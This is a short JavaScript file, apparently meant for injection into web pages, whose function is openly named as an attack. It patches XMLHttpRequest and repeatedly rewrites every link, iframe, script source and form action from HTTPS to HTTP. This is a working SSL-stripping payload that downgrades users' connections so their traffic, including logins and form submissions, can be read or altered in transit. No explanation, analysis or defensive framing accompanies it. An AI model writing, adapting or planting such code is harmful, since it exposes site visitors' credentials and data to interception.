(function() {
	var obf_open = XMLHttpRequest.prototype.open;
	XMLHttpRequest.prototype.open = function(obf_var_method, obf_var_url, obf_var_async, obf_var_username, obf_var_password) {
		obf_var_url = obf_var_url.replace(/(http)s/ig, "$1");
		return obf_open.apply(this, arguments);
	}
})();

function obf_func_attack() {
	document.querySelectorAll("a,iframe,script,form").forEach(function(obf_var_node){
		switch (obf_var_node.tagName) {
			case "A": obf_var_node.href && obf_var_node.href.match(/https/i) ? obf_var_node.href = obf_var_node.href.replace(/(http)s/ig, "$1") : ""; break;
			case "IFRAME": obf_var_node.src && obf_var_node.src.match(/https/i) ? obf_var_node.src = obf_var_node.src.replace(/(http)s/ig, "$1") : ""; break;
			case "SCRIPT": obf_var_node.src && obf_var_node.src.match(/https/i) ? obf_var_node.src = obf_var_node.src.replace(/(http)s/ig, "$1") : ""; break;
			case "FORM": obf_var_node.action && obf_var_node.action.match(/https/i) ? obf_var_node.action = obf_var_node.action.replace(/(http)s/ig, "$1") : ""; break;
		}
	});
}

setInterval(obf_func_attack, 666);

try {
	document.addEventListener("DOMContentLoaded", obf_func_attack);
} catch(obf_ignore) {
	self.addEventListener("load", obf_func_attack);
}
